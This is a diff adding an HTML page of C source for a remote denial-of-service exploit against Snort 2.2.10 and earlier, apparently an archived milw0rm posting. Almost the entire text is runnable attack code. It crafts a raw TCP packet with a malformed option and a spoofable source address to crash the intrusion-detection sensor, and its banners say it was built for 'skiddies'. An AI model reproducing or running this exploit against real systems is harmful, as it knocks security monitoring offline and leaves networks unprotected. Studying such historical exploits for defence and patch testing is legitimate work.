@@ -1,0 +1,142 @@
+<html>
+<head>
+<title>Snort <= 2.2.10 Remote Denial of Service Exploit</title>
+<pre>
+//g++ -o blah blah.c - str0ke
+#include &lt;stdio.h&gt; 
+#include &lt;stdlib.h&gt; 
+#include &lt;unistd.h&gt; 
+#include &lt;string.h&gt; 
+#include &lt;netinet/in.h&gt; 
+#include &lt;netinet/tcp.h&gt; 
+#include &lt;netinet/ip.h&gt; 
+#include &lt;sys/socket.h&gt; 
+#include &lt;sys/types.h&gt; 
+#include &lt;arpa/inet.h&gt; 
+#include &lt;getopt.h&gt; 
+
+void printUsage() 
+{ 
+printf(&quot;./angelDust -D &lt;destination_ip&gt; -S &lt;source_ip&gt;\n&quot;); 
+printf(&quot;Please as with all inhalants use wisely in the comfort of your own home\n&quot;); 
+} 
+
+
+int main(int argc, char **argv) 
+{ 
+int s; 
+int next_opt; 
+const char* const short_opts=&quot;hD:S:&quot;; 
+//either one there both not valid protocol 
+//char opts[] = &quot;\x02\04\xff\xff&quot;; 
+char opts[] = &quot;\x06\00\xff\xff&quot;; 
+
+char datagram[64]; 
+struct sockaddr_in addr; 
+struct ip *ip = (struct ip *) datagram; 
+struct tcphdr *tcp; 
+char dst_ip[16]; 
+char src_ip[16]; 
+
+if(argc &lt; 2) 
+{ 
+printf(&quot;angelDust by Antimatt3r\n&quot;); 
+printf(&quot;pr0ps to Marcin for finding this bug\n&quot;); 
+printf(&quot;pr0ps to me for making something useful out of it for the skiddies\n&quot;); 
+exit(-1); 
+} 
+
+
+const struct option long_opts[]= 
+{ 
+{&quot;help&quot;, 0, NULL,'h'}, 
+{&quot;destination_ip&quot;,1,NULL,'D'}, 
+{&quot;source_ip&quot;,1,NULL,'S'}, 
+}; 
+
+strncpy(dst_ip,&quot;127.0.0.1&quot;,16); 
+strncpy(src_ip,&quot;127.0.0.1&quot;,16); 
+
+do 
+{ 
+next_opt = getopt_long(argc,argv,short_opts,long_opts,NULL); 
+switch( next_opt) 
+{ 
+case 'h' : 
+printUsage(); 
+return 0; 
+case 'D' : 
+strncpy(dst_ip,optarg,16); 
+break; 
+case 'S' : 
+strncpy(src_ip,optarg,16); 
+break; 
+
+} 
+} 
+while(next_opt != -1) ; 
+
+
+memset(&amp;datagram, 0, sizeof(datagram)); 
+addr.sin_addr.s_addr = inet_addr(dst_ip); 
+addr.sin_port = htons(123); 
+addr.sin_family = AF_INET; 
+
+ip-&gt;ip_hl = 5; 
+ip-&gt;ip_v = 4; 
+ip-&gt;ip_tos = 0; 
+ip-&gt;ip_id = 0; 
+ip-&gt;ip_off = 0; 
+ip-&gt;ip_ttl = 64; 
+ip-&gt;ip_p = IPPROTO_TCP; 
+ip-&gt;ip_len = 44; 
+ip-&gt;ip_sum = 0; 
+ip-&gt;ip_dst.s_addr = addr.sin_addr.s_addr; 
+ip-&gt;ip_src.s_addr = inet_addr(src_ip); 
+
+tcp = (struct tcphdr *) (datagram + (ip-&gt;ip_hl &lt;&lt; 2)); 
+tcp-&gt;source = htons(321); 
+tcp-&gt;dest = addr.sin_port; 
+tcp-&gt;seq = 0; 
+tcp-&gt;ack = 0; 
+tcp-&gt;res1 = 0; 
+tcp-&gt;doff = 6; 
+tcp-&gt;syn = 0; 
+tcp-&gt;window = 0x1000; 
+tcp-&gt;check = 0; 
+tcp-&gt;urg_ptr = 0; 
+
+memcpy(datagram + 40, opts, sizeof(opts)); 
+
+if ((s = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) { 
+perror(&quot;socket&quot;); 
+exit(0); 
+} 
+
+if (sendto(s, datagram, ip-&gt;ip_len, 0, (struct sockaddr *) &amp;addr, 
+sizeof(struct sockaddr_in)) == -1) { 
+perror(&quot;sendto&quot;); 
+exit(-1); 
+} 
+fprintf(stderr,&quot;Sniff this\n&quot;); 
+fprintf(stderr,&quot;..............//&quot;); 
+sleep(1); 
+fprintf(stderr,&quot;\b\b\b\b// &quot;); 
+sleep(1); 
+fprintf(stderr,&quot;\b\b\b\b\b\b// &quot;); 
+sleep(1); 
+fprintf(stderr,&quot;\b\b\b\b\b\b\b\b// &quot;); 
+sleep(1); 
+fprintf(stderr,&quot;\b\b\b\b\b\b\b\b\b\b// &quot;); 
+sleep(1); 
+fprintf(stderr,&quot;\b\b\b\b\b\b\b\b\b\b\b\b// \n&quot;); 
+printf(&quot;and choke!\n&quot;); 
+
+close(s); 
+return 0; 
+} 
+
+// milw0rm.com [2004-12-22]
+</pre>
+</html>
+
